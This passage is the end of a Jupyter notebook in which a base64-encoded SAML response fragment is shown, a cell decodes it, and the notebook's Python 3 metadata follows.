i4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4='"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str4.decode()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fbc0e7d4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
